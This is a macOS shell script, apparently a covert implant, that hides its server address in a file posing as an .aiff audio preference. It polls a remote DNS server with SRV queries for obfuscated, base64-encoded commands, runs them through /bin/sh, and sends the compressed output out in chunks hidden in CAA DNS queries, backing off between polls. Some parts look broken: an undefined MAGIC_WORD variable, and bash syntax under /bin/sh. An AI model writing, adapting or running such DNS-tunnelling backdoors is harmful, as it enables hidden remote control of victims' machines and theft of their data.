#!/bin/sh
# skiterna
set -u -o pipefail

# TODO: Use domain names from /etc/resolv.conf

readonly HOSTNAME=$(hostname)
readonly DOMAIN=$(grep "^search" /etc/resolv.conf | cut -d" " -f2)
readonly MAGIC_NUM=$(echo $HOSTNAME | cksum | cut -c1-5)
readonly MAGIC_NUM2=$(stat -f %m /etc | cut -c8-9)
readonly CLIENT_ID="${MAGIC_NUM}${MAGIC_NUM2}"

SLEEP=1
readonly MAX_SLEEP=1200

d64(){ local N=0 V=0 C;while :;do((V<<=6,++N));IFS= read -n1 C&&{ printf -vC '%d' "'$C";((C=C>64&&C<91?C-65:C>96&&C<123?C-71:C>47&&C<58?C+4:C==43?62:C==47?63:(V>>=6,--N,0),V|=C));};((N==4))&&{ for((N-=2;N>=0;--N));do printf `printf '\\\\x%02X' $((V>>N*8&255))`;done;[ -z "$C" ]&&break;((V=N=0));};done;}

paths="/Library/Preferences/Audio/Data /tmp"
for path in $paths; do
    if [[ -w "${path}" ]]; then
        readonly _CFG_PATH="${path}/${MAGIC_WORD}.aiff"
    fi
done

remote=$(tr 012. .201 < $_CFG_PATH)

extend_sleep() {
    SLEEP=$(expr "${SLEEP}" \* 2)
    if [[ "${SLEEP}" -gt "${MAX_SLEEP}" ]]; then
        SLEEP="${MAX_SLEEP}"
    fi
}

vendor() {
    if [[ -d /System ]]; then
        echo "apple"
        return 0
    fi
    echo "unknown"
}


next_cmd() {
    local record="${CLIENT_ID}.__$(vendor)__${DOMAIN}_${HOSTNAME}"
    local kw=$(echo "${record}" | tr 'A-Z' 'a-z' | sed s/'\(.\)'/'\1\n'/g| sort -u | xargs | sed s/" "/""/g )
    local raw=$(nslookup -q=srv "${record}" "${remote}" | grep -o "_loc_.*")
    if [[ "${raw}" == "" ]]; then
        return 1
    fi
    local enc_cmd=$(echo "${raw}" | sed -e s/_loc_\.// -e s/\.local\.// -e 's/"\/"//g')
    # enc=" $(echo $kw | cut -c1);$(echo $kw | cut -c2-4)|$(echo $kw | cut -c6-8)-$(echo $kw | cut -c9-12)&$(echo $kw | cut -c13-)"
    local enc="$(echo $kw | cut -c1-6) "
    local dec="$(echo "${enc}" | rev | tail -n1)"
    local b=$(echo "${enc_cmd}" | sed s/__/"="/g | tr "${enc}" "${dec}")
    local cmd=$(echo "$b" | d64)
    local out=$(/bin/sh -c "${cmd}")
    echo "${out}"
    return 0
}

send_response() {
    pre_split=$(mktemp)
    echo "${out}" | compress -c | openssl base64 > "${pre_split}"
    size=$(stat -f %z "${pre_split}")
    cd "${TMPDIR}"

    split -b 63 "${pre_split}" "${MAGIC_NUM}."
    chunk_id=0

    for chunk in ${MAGIC_NUM}.*; do
        chunk_id=$(expr $chunk_id + 1)
        CAA_RECORD="${MAGIC_NUM}.${size}.$(cat $chunk)"
        raw=$(nslookup -q=caa "${CAA_RECORD}" "${remote}" | grep -o "_caa_.*")
        rm "${chunk}"
    done
}

while true; do
    echo "getting next command ..."
    out=$(next_cmd)
    if [[ $? != 0 ]]; then
        echo "waiting for next command ..."
        extend_sleep
    else 
        echo "out: ${out}"
        send_response "${out}"
    fi
    sleep "${SLEEP}"
done